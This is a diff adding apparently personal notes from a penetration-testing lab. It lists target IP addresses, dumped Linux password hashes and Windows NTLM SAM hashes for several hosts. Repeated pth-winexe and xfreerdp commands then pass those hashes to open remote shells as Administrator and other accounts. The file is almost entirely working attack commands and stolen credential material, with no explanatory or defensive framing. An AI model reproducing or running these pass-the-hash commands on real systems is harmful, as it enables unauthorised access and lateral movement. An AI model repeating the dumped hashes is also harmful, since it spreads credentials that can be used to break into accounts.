@@ -1,0 +1,75 @@
+Take the hash, export it, pass it using pth. Find it under password hashes in your top applications menu. 
+
+root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b
+root@kali:~# pth-winexe -U administrator% //10.11.1.7 cad
+
+xfreerdp /u:Administrator /d:fakeDom /pth:abc123abc123abc123abc123abc123ab /v:10.20.30.40 (try this one out too)
+
+
+10.11.1.8
+10.11.1.24
+10.11.1.31
+10.11.1.73
+10.11.1.128
+10.11.1.136 (this one did something weird)
+10.11.1.145
+10.11.1.202
+10.11.1.218
+10.11.1.220
+10.11.1.223
+10.11.1.227
+10.11.1.229
+10.11.1.230
+
+It's worth trying the others again if this doesn't work.
+
+146
+root:$1$u4wOPozf$FAxWxqFiwRXN7lXAJONTT1:0:0:root:/root:/bin/bash
+ftpuser:$1$wwu7ifTb$LnKVwBXYkV8QgPuubihzF0:1000:1000:ftpuser,,,:/home/ftpuser:/bin/bash
+
+202
+admin:1004:aad3b435b51404eeaad3b435b51404ee:7a88f1e3c4aea37cae88cd8febd5c844:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a:::
+alison:1005:aad3b435b51404eeaad3b435b51404ee:10d0ba70f95b81b77373fe89d02650b8:::
+backup:1006:d043063e38d7ea968b1c09d630094d48:6ac617d1b943edaf3d64cd98da379438:::
+david:1007:f671583503e19591c912c0626f0bd172:33aafea341b5a134c91dcd5a5aa33e9d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+IUSR_ORACLE:1001:4a16000301db6b04c2f85dad359cf4f7:7f31d3534356ef0ae7d00db624ceccbc:::
+IWAM_ORACLE:1002:88d1c7c5451b2005186386e53bd1d1be:7eeba2b6db13a4020973e5c88fdc441f:::
+john:1008:aad3b435b51404eeaad3b435b51404ee:3750f000f83855ddc0a490c0b0d89823:::
+lisa:1009:a179639dcaf4e1c4aad3b435b51404ee:8acf28fdc0168e003fb3e05bcb463d1b:::
+mark:1010:31be3a5244f9e023d4dcc2975dc76fb2:e63ca43219c35f2c6db481e8f730833a:::
+TsInternetUser:1000:c2ace982ab04827801470c09b9425328:94b383a103959380aac8ff00f305ef12:::
+
+5
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
+alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
+
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7
+pth-winexe -U SUPPORT_388945a0% //10.11.1.8 cmd
+
+export SMBHASH=05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef
+pth-winexe -U HelpAssistant% //10.11.1.8 cmd
+
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+pth-winexe -U Guest% //10.11.1.8 cmd
+
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe
+pth-winexe -U alice% //10.11.1.8 cmd
+
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b
+pth-winexe -U Administrator% //10.11.1.8 cmd
+
+
+pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe //10.11.1.8 "cmd"
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b //10.11.1.8 "cmd"
+
+pth-winexe -U  guest%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //10.11.1.8 "cmd"
+
+pth-winexe -U HelpAssistant%05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef //10.11.1.8 "cmd"
+
+pth-winexe -U SUPPORT_388945a0%aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7 //10.11.1.8 "cmd"
